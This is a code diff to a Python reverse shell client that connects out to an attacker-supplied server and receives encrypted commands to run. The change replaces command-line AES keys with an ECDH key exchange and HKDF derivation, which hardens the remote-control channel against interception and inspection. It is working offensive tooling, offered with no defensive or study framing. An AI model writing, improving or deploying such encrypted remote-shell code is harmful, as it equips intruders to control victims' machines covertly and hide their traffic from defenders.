@@ -3,7 +3,9 @@
 import socket
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives import padding, hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.backends import default_backend
 import subprocess
 
@@ -21,17 +23,37 @@ def aes_decrypt(data, key, iv):
     decrypted_data = decryptor.update(data) + decryptor.finalize()
     return unpadder.update(decrypted_data) + unpadder.finalize()
 
-def reverse_shell(server_ip, server_port, key, iv):
+def reverse_shell(server_ip, server_port):
+    client_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
+    client_public_key = client_private_key.public_key()
+
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((server_ip, server_port))
+
     try:
-        server_challenge = client.recv(1024)
-        if server_challenge == b"KEY_CHECK":
-            client.send(key + iv)
-        else:
-            print("[!] Unexpected server response. Closing connection.")
-            client.close()
-            return
+        server_public_key_bytes = client.recv(4096)
+        server_public_key = serialization.load_pem_public_key(
+            server_public_key_bytes,
+            backend=default_backend()
+        )
+
+        client.send(client_public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        ))
+
+        shared_key = client_private_key.exchange(ec.ECDH(), server_public_key)
+        derived_key = HKDF(
+            algorithm=hashes.SHA256(),
+            length=48,
+            salt=None,
+            info=b'handshake data',
+            backend=default_backend()
+        ).derive(shared_key)
+
+        key = derived_key[:32]
+        iv = derived_key[32:48]
+
         while True:
             encrypted_command = client.recv(4096)
             if not encrypted_command:
@@ -51,12 +73,5 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("-s", "--server", required=True, help="Server IP address")
     parser.add_argument("-p", "--port", required=True, type=int, help="Server port")
-    parser.add_argument("-k", "--key", required=True, help="AES key in hex format (32 bytes)")
-    parser.add_argument("-v", "--iv", required=True, help="AES IV in hex format (16 bytes)")
     args = parser.parse_args()
-    key = bytes.fromhex(args.key)
-    iv = bytes.fromhex(args.iv)
-    if len(key) != 32 or len(iv) != 16:
-        print("[!] Key must be 32 bytes and IV must be 16 bytes in hex format.")
-        exit(1)
-    reverse_shell(args.server, args.port, key, iv)
+    reverse_shell(args.server, args.port)
